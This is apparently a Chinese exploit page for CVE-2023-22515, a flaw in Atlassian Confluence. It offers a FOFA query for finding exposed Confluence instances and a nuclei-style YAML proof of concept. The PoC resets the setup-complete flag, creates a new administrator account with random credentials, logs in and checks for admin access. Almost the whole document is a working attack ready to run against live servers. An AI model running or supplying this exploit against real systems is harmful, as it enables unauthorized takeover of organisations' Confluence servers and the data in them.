## Confluence 未授权提权访问漏洞 CVE-2023-22515

## fofa
app="ATLASSIAN-Confluence"

## poc yaml格式
```
variables:
  username: "{{rand_base(10)}}"
  password: "{{rand_base(10)}}"
  email: "{{username}}@{{password}}"
http:
  - raw:
      - |
        GET /setup/setupadministrator-start.action HTTP/1.1
        Host: {{Hostname}}
      - |
        GET /server-info.action?bootstrapStatusProvider.applicationConfig.setupComplete=0&cache{{randstr}} HTTP/1.1
        Host: {{Hostname}}
      - |
        GET /setup/setupadministrator-start.action HTTP/1.1
        Host: {{Hostname}}
      - |
        @timeout:20s
        POST /setup/setupadministrator.action HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        X-Atlassian-Token: no-check

        username={{to_lower(username)}}&fullName=admin&email={{email}}.com&password={{password}}&confirm={{password}}&setup-next-button=Next
      - |
        POST /dologin.action HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        X-Atlassian-Token: no-check

        os_username={{to_lower(username)}}&os_password={{password}}&login=Log+in&os_destination=%2Findex.action
      - |
        GET /welcome.action HTTP/1.1
        Host: {{Hostname}}
    cookie-reuse: true
    redirects: true
    matchers:
      - type: dsl
        dsl:
          - contains(body_1, 'Setup is already complete')
          - contains(body_3, 'Please configure the system administrator account for this Confluence installation')
          - contains(location_5, '/index.action')
          - status_code_5 == 302
          - contains(body_6, 'Administration')
        condition: and

```

